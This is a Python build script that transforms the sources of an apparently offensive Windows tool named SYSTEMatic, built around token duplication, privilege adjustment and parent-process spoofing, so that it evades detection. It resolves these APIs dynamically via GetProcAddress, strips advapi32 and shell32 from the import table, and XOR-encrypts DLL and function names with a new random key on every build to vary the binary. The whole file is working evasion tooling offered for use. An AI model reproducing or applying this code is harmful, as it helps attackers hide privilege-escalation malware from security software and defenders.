#!/usr/bin/env python3
"""
make_evasive.py -- Dynamic API resolution transformer for SYSTEMatic.

Reads src/ files and builds a modified version where all advapi32, shell32,
and selected kernel32 imports are resolved at runtime via GetProcAddress
instead of being listed in the IAT (Import Address Table).

Steps:
  1. Copy src/ to a temp directory
  2. Generate dynapi.h  : typedefs + #define macros shadowing each API name
  3. Generate dynapi.c  : _dyn_* variables + InitDynAPI() with:
       - XOR-encrypted DLL and function name strings (random key per build)
       - runtime _xdec() decryption before LoadLibraryA / GetProcAddress
  4. Patch temp common.h : add #include "dynapi.h"
  5. Patch temp main.c   : add InitDynAPI() call at start of wmain
  6. Compile from temp dir without -ladvapi32 / -lshell32
  7. Clean up temp dir

Result:
  - advapi32 and shell32 disappear from the PE IAT
  - selected kernel32 APIs (process enumeration + parent spoofing) resolved dynamically
  - DLL names and function name strings are XOR-encrypted in .rdata
  - Different XOR key on every build -> different binary every run

Invoked by Makefile -- environment variables:
  CC_EV     compiler binary
  CFLAGS_EV compiler flags (space-separated)
  LFLAGS_EV linker flags   (space-separated)
  OUT_EV    output binary  (default: SYSTEMatic.exe)
"""

import os
import sys
import random
import shutil
import subprocess
import tempfile

SRC_DIR = "src"

# APIs to resolve dynamically.
# Tuple: (dll, function_name, return_type, calling_convention, full_param_list)
# dynapi.c does NOT include dynapi.h to avoid macro self-expansion.
APIS = [
    (
        "advapi32", "OpenProcessToken", "BOOL", "WINAPI",
        "HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle",
    ),
    (
        "advapi32", "GetTokenInformation", "BOOL", "WINAPI",
        "HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, "
        "LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength",
    ),
    (
        "advapi32", "AllocateAndInitializeSid", "BOOL", "WINAPI",
        "PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, "
        "DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, "
        "DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, "
        "DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid",
    ),
    (
        "advapi32", "EqualSid", "BOOL", "WINAPI",
        "PSID pSid1, PSID pSid2",
    ),
    (
        "advapi32", "FreeSid", "PVOID", "WINAPI",
        "PSID pSid",
    ),
    (
        "advapi32", "LookupPrivilegeValueW", "BOOL", "WINAPI",
        "LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid",
    ),
    (
        "advapi32", "AdjustTokenPrivileges", "BOOL", "WINAPI",
        "HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, "
        "DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength",
    ),
    (
        "advapi32", "DuplicateTokenEx", "BOOL", "WINAPI",
        "HANDLE hExistingToken, DWORD dwDesiredAccess, "
        "LPSECURITY_ATTRIBUTES lpTokenAttributes, "
        "SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, "
        "TOKEN_TYPE TokenType, PHANDLE phNewToken",
    ),
    (
        "advapi32", "CreateProcessWithTokenW", "BOOL", "WINAPI",
        "HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, "
        "LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, "
        "LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, "
        "LPPROCESS_INFORMATION lpProcessInformation",
    ),
    (
        "shell32", "IsUserAnAdmin", "BOOL", "WINAPI",
        "void",
    ),
    # kernel32 -- process enumeration + parent spoofing fallback
    (
        "kernel32", "CreateToolhelp32Snapshot", "HANDLE", "WINAPI",
        "DWORD dwFlags, DWORD th32ProcessID",
    ),
    (
        "kernel32", "Process32FirstW", "BOOL", "WINAPI",
        "HANDLE hSnapshot, LPPROCESSENTRY32W lppe",
    ),
    (
        "kernel32", "Process32NextW", "BOOL", "WINAPI",
        "HANDLE hSnapshot, LPPROCESSENTRY32W lppe",
    ),
    (
        "kernel32", "OpenProcess", "HANDLE", "WINAPI",
        "DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId",
    ),
    (
        "kernel32", "InitializeProcThreadAttributeList", "BOOL", "WINAPI",
        "LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, "
        "DWORD dwFlags, PSIZE_T lpSize",
    ),
    (
        "kernel32", "UpdateProcThreadAttribute", "BOOL", "WINAPI",
        "LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, "
        "DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, "
        "PVOID lpPreviousValue, PSIZE_T lpReturnSize",
    ),
    (
        "kernel32", "DeleteProcThreadAttributeList", "VOID", "WINAPI",
        "LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList",
    ),
    (
        "kernel32", "CreateProcessW", "BOOL", "WINAPI",
        "LPCWSTR lpApplicationName, LPWSTR lpCommandLine, "
        "LPSECURITY_ATTRIBUTES lpProcessAttributes, "
        "LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, "
        "DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, "
        "LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation",
    ),
]


def xor_encrypt(s: str, key: int) -> list[int]:
    """XOR-encrypt a null-terminated ASCII string. Returns encrypted bytes incl. null."""
    return [(b ^ key) & 0xFF for b in (s.encode("ascii") + b"\x00")]


def fmt_bytes(data: list[int]) -> str:
    return ", ".join(f"0x{b:02x}" for b in data)


def gen_dynapi_h(apis: list) -> str:
    lines = [
        "#pragma once",
        "#include <windows.h>",
        "",
        "/* typedefs */",
    ]
    for _, name, ret, conv, params in apis:
        lines.append(f"typedef {ret} ({conv} *pfn_{name})({params});")

    lines += ["", "/* extern declarations */"]
    for _, name, *_ in apis:
        lines.append(f"extern pfn_{name} _dyn_{name};")

    lines += ["", "void InitDynAPI(void);", ""]

    lines.append("/* shadow macros -- replace every static call with the dynamic pointer */")
    for _, name, *_ in apis:
        lines.append(f"#define {name} _dyn_{name}")

    lines.append("")
    return "\n".join(lines)


def gen_dynapi_c(apis: list, key: int) -> str:
    """Generate dynapi.c with XOR-encrypted DLL and function name strings."""
    dlls: dict[str, list[str]] = {}
    for dll, name, *_ in apis:
        dlls.setdefault(dll, []).append(name)

    lines = [
        "/* dynapi.c -- intentionally does NOT include dynapi.h",
        "   to avoid macro expansion of the API names used below.",
        f"   XOR key: 0x{key:02x} (randomly generated at build time) */",
        "#include <windows.h>",
        "#include <tlhelp32.h>",
        "",
        "/* local typedefs (mirror of dynapi.h, without the #define macros) */",
    ]
    for _, name, ret, conv, params in apis:
        lines.append(f"typedef {ret} ({conv} *pfn_{name})({params});")

    lines += ["", "/* global function pointer definitions */"]
    for _, name, *_ in apis:
        lines.append(f"pfn_{name} _dyn_{name} = NULL;")

    lines += [
        "",
        "/* XOR-decrypt a byte array in-place */",
        "static void _xdec(unsigned char* buf, unsigned int len) {",
        f"    for (unsigned int i = 0; i < len; i++) buf[i] ^= 0x{key:02x};",
        "}",
        "",
        "/* XOR-encrypted DLL names (key changes on every build) */",
    ]

    # Encrypted DLL name arrays
    for dll in dlls:
        enc = xor_encrypt(f"{dll}.dll", key)
        lines.append(f"static unsigned char _dll_{dll}[] = {{ {fmt_bytes(enc)} }};")

    lines += ["", "/* XOR-encrypted function name arrays */"]
    for _, name, *_ in apis:
        enc = xor_encrypt(name, key)
        lines.append(f"static unsigned char _fn_{name}[] = {{ {fmt_bytes(enc)} }};")

    lines += ["", "void InitDynAPI(void) {"]

    # Decrypt DLL names and load
    for dll in dlls:
        var = f"h{dll.capitalize()}"
        lines.append(f"    _xdec(_dll_{dll}, sizeof(_dll_{dll}));")
        lines.append(f"    HMODULE {var} = LoadLibraryA((char*)_dll_{dll});")

    lines.append("")

    # Decrypt function names and resolve
    for dll, names in dlls.items():
        var = f"h{dll.capitalize()}"
        for name in names:
            lines.append(f"    _xdec(_fn_{name}, sizeof(_fn_{name}));")
            lines.append(
                f"    _dyn_{name} = (pfn_{name})GetProcAddress({var}, (char*)_fn_{name});"
            )

    lines += ["}", ""]
    return "\n".join(lines)


def patch_common_h(content: str) -> str:
    """Insert #include "dynapi.h" after the last existing #include line."""
    lines = content.splitlines()
    last_include = max(
        (i for i, ln in enumerate(lines) if ln.startswith("#include")),
        default=-1,
    )
    if last_include >= 0:
        lines.insert(last_include + 1, '#include "dynapi.h"')
    return "\n".join(lines) + "\n"


def patch_main_c(content: str) -> str:
    """Insert InitDynAPI() as the first call in wmain, before argument parsing."""
    marker = "    for (int i = 1; i < argc; i++) {"
    return content.replace(marker, "    InitDynAPI();\n\n" + marker, 1)


def main() -> None:
    cc     = os.environ.get("CC_EV", "x86_64-w64-mingw32-clang")
    cflags = os.environ.get("CFLAGS_EV", "").split()
    lflags = os.environ.get("LFLAGS_EV", "").split()
    out    = os.environ.get("OUT_EV", "SYSTEMatic.exe")

    key = random.randint(0x01, 0xFF)  # random XOR key, never 0 (would be a no-op)

    tmpdir = tempfile.mkdtemp(prefix="systematic_evasive_")
    try:
        # Step 1 -- copy src/ to temp dir
        for fname in os.listdir(SRC_DIR):
            shutil.copy(os.path.join(SRC_DIR, fname), os.path.join(tmpdir, fname))

        # Step 2 -- generate dynapi.h
        with open(os.path.join(tmpdir, "dynapi.h"), "w") as f:
            f.write(gen_dynapi_h(APIS))

        # Step 3 -- generate dynapi.c with XOR-encrypted strings
        with open(os.path.join(tmpdir, "dynapi.c"), "w") as f:
            f.write(gen_dynapi_c(APIS, key))

        # Step 4 -- patch common.h
        p = os.path.join(tmpdir, "common.h")
        with open(p) as f:
            content = f.read()
        with open(p, "w") as f:
            f.write(patch_common_h(content))

        # Step 5 -- patch main.c
        p = os.path.join(tmpdir, "main.c")
        with open(p) as f:
            content = f.read()
        with open(p, "w") as f:
            f.write(patch_main_c(content))

        # Step 6 -- compile (no -ladvapi32 / -lshell32)
        srcs = [
            os.path.join(tmpdir, fname)
            for fname in ["main.c", "token.c", "process.c", "error.c", "dynapi.c"]
        ]
        cmd = [cc] + cflags + srcs + lflags + ["-o", out]
        print(" ".join(cmd))
        result = subprocess.run(cmd)
        if result.returncode != 0:
            print("[-] Compilation failed.", file=sys.stderr)
            sys.exit(result.returncode)

        print(f"[+] {out} built")
        print(f"    XOR key        : 0x{key:02x}")
        print(f"    IAT            : advapi32 + shell32 removed, kernel32 APIs partially resolved")
        print(f"    Strings        : DLL + function names XOR-encrypted in .rdata")
        print(f"    Runtime        : LoadLibraryA + GetProcAddress after in-place decrypt")

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


if __name__ == "__main__":
    main()
